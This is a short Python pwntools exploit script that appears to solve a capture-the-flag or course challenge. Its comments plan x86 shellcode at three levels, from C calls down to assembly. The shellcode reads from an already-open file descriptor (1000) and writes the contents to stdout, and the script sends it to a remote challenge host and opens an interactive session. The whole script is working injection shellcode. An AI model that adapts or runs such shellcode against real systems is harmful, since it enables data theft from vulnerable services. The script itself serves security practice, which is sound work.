from pwn import *

'''
high level:

read(1000, void *buf, 1000);
write(1, const void *buf, 1000)
'''
'''
med level

clear eax, ebx, edx

read:
set eax 0x03
set ebx 0x3E8
set ecx esp
set edx 0xFF
interrupt

eax now has num bytes read

write
set edx eax
set eax 0x04
set ebx 0x01
set ecx esp
interrupt
'''
'''
low level

xor eax, eax
xor ebx, ebx
xor edx, edx
mov al, 0x3
mov bx, 0x3E8
mov ecx, esp
mov dl, 0xFF
int 0x80

xchg eax, edx
mov al, 0x4
mov bx, 0x1
int 0x80
'''

p = remote('plsdonthaq.me', 3001)
#p = process('./simple')

shellcode = asm(""" sub esp, 0x3E8
					xor eax, eax
				    xor ebx, ebx
					xor edx, edx
				    mov al, 0x3
				    mov bx, 0x3E8
				    mov ecx, esp
				    mov dl, 0xFF
				    int 0x80

				    xchg eax, edx
				    mov al, 0x4
				    mov bx, 0x1
				    int 0x80

				    add esp, 0x3E8
				    """)

#print(len(shellcode), shellcode)

p.sendline(shellcode)

p.interactive()
